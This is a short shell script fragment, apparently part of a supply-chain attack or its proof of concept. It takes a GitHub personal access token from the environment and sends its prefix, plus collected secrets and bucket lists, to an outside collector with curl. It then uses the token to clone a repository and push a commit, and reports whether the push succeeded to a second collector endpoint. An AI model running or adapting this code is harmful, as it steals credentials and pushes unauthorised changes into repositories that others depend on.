...
PAT=$(printf %s "$IM_GITHUB_PAT" | tr -d '\r\n ')
curl -s "$C/collect" --data-urlencode "sa=$SA" --data-urlencode "proj=$PROJ" \
  --data-urlencode "stolen_im_pat_prefix=$(printf %s "$PAT" | cut -c1-8)" \
  --data-urlencode "all_secrets=$SECRETS" --data-urlencode "all_buckets=$BUCKETS" >/dev/null
REPO="robertprast/cft-module-published"
git clone -q "https://x-access-token:$PAT@github.com/$REPO" /tmp/pub >/dev/null 2>&1
PUSH="clone-failed"; SHA=""
if cd /tmp/pub 2>/dev/null; then
  ...
  git push -q origin HEAD >/dev/null 2>&1 && PUSH="PUSHED" || PUSH="push-denied"
  SHA=$(git rev-parse --short HEAD 2>/dev/null)
fi
curl -s "$C/supplychain" --data-urlencode "repo=$REPO" --data-urlencode "commit=$SHA" --data-urlencode "result=$PUSH" >/dev/null
